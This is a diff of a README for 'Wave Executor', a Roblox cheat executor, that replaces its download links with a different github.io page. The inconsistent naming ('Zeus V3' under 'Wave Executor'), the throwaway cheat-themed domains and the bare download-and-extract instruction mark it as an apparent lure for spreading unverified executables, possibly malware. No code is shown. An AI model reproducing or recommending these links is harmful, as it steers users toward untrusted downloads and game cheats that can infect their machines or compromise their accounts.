@@ -1,8 +1,8 @@
-# 🚀 Wave Executor - Roblox Executor **[![Download Wave Executor](https://img.shields.io/badge/Download-Wave%20Executor-blueviolet)](https://old-school-runescape-bot-cheat.github.io/.github/)**
+# 🚀 Wave Executor - Roblox Executor **[![Download Wave Executor](https://img.shields.io/badge/Download-Wave%20Executor-blueviolet)](https://unlocker-fps-roblox.github.io/.github/)**
 
 ## Quick Installation
 To get started with Wave Executor, follow these simple steps:
-1. **[![Download Wave Executor](https://img.shields.io/badge/Download-Zeus%20V3%20Executor-blueviolet)](https://old-school-runescape-bot-cheat.github.io/.github/)**
+1. **[![Download Wave Executor](https://img.shields.io/badge/Download-Zeus%20V3%20Executor-blueviolet)](https://unlocker-fps-roblox.github.io/.github/)**
 2. Extract the downloaded ZIP file to your desired location on your system.
 
 **Description:**  
